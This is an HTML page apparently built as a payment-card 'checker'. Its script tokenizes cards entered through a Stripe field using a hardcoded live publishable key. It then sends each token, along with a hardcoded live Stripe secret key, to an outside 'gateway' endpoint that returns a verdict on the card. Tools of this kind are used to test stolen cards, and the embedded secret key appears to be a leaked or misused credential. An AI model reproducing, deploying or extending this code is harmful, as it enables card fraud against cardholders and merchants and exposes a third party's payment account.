<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Token Matrix</title>
  <script src="https://js.stripe.com/v3/"></script>
  <style>
    :root {
      --bg: #0a0e14;
      --card: #1a2028;
      --text: #d1d5db;
      --neon-blue: #00f0ff;
      --neon-green: #00ff00;
      --border: #2d3748;
      --shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      --radius: 10px;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'IBM Plex Mono', monospace;
      background: var(--bg);
      color: var(--text);
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 24px;
      position: relative;
      overflow: hidden;
    }
    body::before {
      content: '1010 1101 0010 1011 0101 1110 1001 0010 1100 1011 0100 1111';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      color: var(--neon-green);
      font-size: 16px;
      opacity: 0.15;
      background: repeating-linear-gradient(
        0deg,
        rgba(0, 255, 0, 0.2) 0px,
        rgba(0, 255, 0, 0.2) 1px,
        transparent 1px,
        transparent 50px
      );
      animation: matrix-rain 12s linear infinite;
      z-index: -1;
      white-space: pre-wrap;
      line-height: 24px;
    }
    @keyframes matrix-rain {
      0% { transform: translateY(0); }
      100% { transform: translateY(50px); }
    }
    .card {
      width: 100%;
      max-width: 1080px;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      box-shadow: var(--shadow), 0 0 25px rgba(0, 240, 255, 0.3);
      padding: 32px;
      display: grid;
      grid-template-columns: 1fr 2fr;
      gap: 32px;
      z-index: 1;
    }
    .panel { padding: 12px; }
    .form-card {
      background: #222b33;
      border: 2px solid var(--neon-blue);
      border-radius: var(--radius);
      padding: 24px;
      box-shadow: 0 0 15px var(--neon-blue);
    }
    .stripe-element {
      padding: 16px;
      border: 2px solid var(--neon-blue);
      border-radius: 8px;
      background: #0a0e14;
      color: var(--text);
      font-size: 16px;
    }
    .actions {
      margin-top: 16px;
      display: flex;
      justify-content: flex-end;
    }
    .btn {
      background: linear-gradient(90deg, var(--neon-green), var(--neon-blue));
      color: #000;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      text-transform: uppercase;
      transition: transform 0.2s, box-shadow 0.2s;
    }
    .btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 0 20px var(--neon-green), 0 0 20px var(--neon-blue);
    }
    .btn[disabled] {
      opacity: 0.4;
      cursor: not-allowed;
    }
    .right-panel {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 24px;
      background: #222b33;
      border: 2px solid var(--border);
      border-radius: var(--radius);
      padding: 24px;
      box-shadow: 0 0 15px var(--neon-blue);
    }
    .sub-panel {
      display: flex;
      flex-direction: column;
    }
    .sub-panel-title {
      font-size: 16px;
      font-weight: 600;
      color: var(--neon-green);
      margin-bottom: 12px;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      text-shadow: 0 0 6px var(--neon-green);
    }
    .result {
      font-family: 'IBM Plex Mono', monospace;
      font-size: 14px;
      background: #0a0e14;
      color: var(--text);
      padding: 16px;
      border: 2px solid var(--neon-blue);
      border-radius: 8px;
      overflow: auto;
      max-height: 480px;
      white-space: pre-wrap;
      flex: 1;
      box-shadow: inset 0 0 6px rgba(0, 240, 255, 0.3);
    }
    footer {
      margin-top: auto;
      padding: 24px 0;
      text-align: center;
      width: 100%;
      z-index: 1;
      position: absolute;
      bottom: 0;
      left: 0;
    }
    .developed-by {
      font-size: 18px;
      color: var(--neon-blue);
      text-shadow: 0 0 10px var(--neon-blue), 0 0 20px var(--neon-blue);
      margin-bottom: 6px;
      letter-spacing: 2.5px;
      text-transform: uppercase;
    }
    .copyright {
      font-size: 12px;
      color: var(--text);
      opacity: 0.6;
    }
    @media (max-width: 768px) {
      .card { grid-template-columns: 1fr; }
      .right-panel { grid-template-columns: 1fr; gap: 16px; }
    }
  </style>
</head>
<body>
  <div class="card" role="main">
    <div class="panel">
      <div class="form-card">
        <div id="card-element" class="stripe-element"></div>
        <div class="actions">
          <button id="checkBtn" class="btn">Check</button>
        </div>
      </div>
    </div>
    <div class="panel right-panel">
      <div class="sub-panel">
        <div class="sub-panel-title">Token</div>
        <div id="token-result" class="result"></div>
      </div>
      <div class="sub-panel">
        <div class="sub-panel-title">API Response</div>
        <div id="result" class="result"></div>
      </div>
    </div>
  </div>
  <footer>
    <div class="developed-by">Developed by Kali Linux</div>
    <div class="copyright">Â© All Rights Reserved</div>
  </footer>
  <script>
    (async () => {
      const API_ENDPOINT_BASE = "https://phop.onrender.com/gateway=skbased/key=rockysoon";
      const SK_KEY = "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";
      const PK = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ";
      const checkBtn = document.getElementById('checkBtn');
      const tokenResultEl = document.getElementById('token-result');
      const resultEl = document.getElementById('result');
      let stripe = null;
      let elements = null;
      let card = null;

      function setTokenResult(text) { tokenResultEl.textContent = text; }
      function setHtmlTokenResult(obj) { tokenResultEl.textContent = JSON.stringify(obj, null, 2); }
      function setResult(text) { resultEl.textContent = text; }
      function setHtmlResult(obj) { resultEl.textContent = JSON.stringify(obj, null, 2); }

      function initStripe() {
        if (card) { card.unmount(); card = null; elements = null; stripe = null; }
        try {
          stripe = Stripe(PK);
          elements = stripe.elements();
          const style = {
            base: {
              fontFamily: '"IBM Plex Mono", monospace',
              fontSize: '16px',
              color: 'var(--neon-green)',
              '::placeholder': { color: '#6b7280' },
              lineHeight: '28px'
            },
            invalid: {
              color: '#ff5555'
            }
          };
          card = elements.create('card', {
            style,
            hidePostalCode: true,
            classes: { base: 'stripe-element' }
          });
          card.mount('#card-element');
          card.on('change', (e) => {
            if (e.error) {
              setTokenResult(e.error.message);
              setResult('');
            } else {
              setTokenResult('');
              setResult('');
            }
          });
        } catch (err) {
          setTokenResult('Stripe init error: ' + err.message);
          setResult('');
        }
      }

      async function tokenizeAndSend() {
        if (!stripe || !card) {
          setTokenResult('Stripe not initialized');
          setResult('');
          checkBtn.disabled = false;
          return;
        }
        setTokenResult('Processing...');
        setResult('Processing...');
        const { token, error } = await stripe.createToken(card);
        if (error) {
          setTokenResult(error.message);
          setResult('');
          checkBtn.disabled = false;
          return;
        }
        setHtmlTokenResult(token);
        try {
          const url = `${API_ENDPOINT_BASE}?sk_key=${encodeURIComponent(SK_KEY)}&token=${encodeURIComponent(token.id)}`;
          const resp = await fetch(url, { method: "GET" });
          const text = await resp.text();
          try {
            const json = JSON.parse(text);
            setHtmlResult(json);
          } catch {
            setResult(text);
          }
        } catch (err) {
          setResult('API error: ' + err.message);
        }
        checkBtn.disabled = false;
        initStripe(); // Reset card input after processing
      }

      initStripe();

      checkBtn.addEventListener('click', () => {
        checkBtn.disabled = true;
        tokenizeAndSend();
      });
    })();
  </script>
</body>
</html>
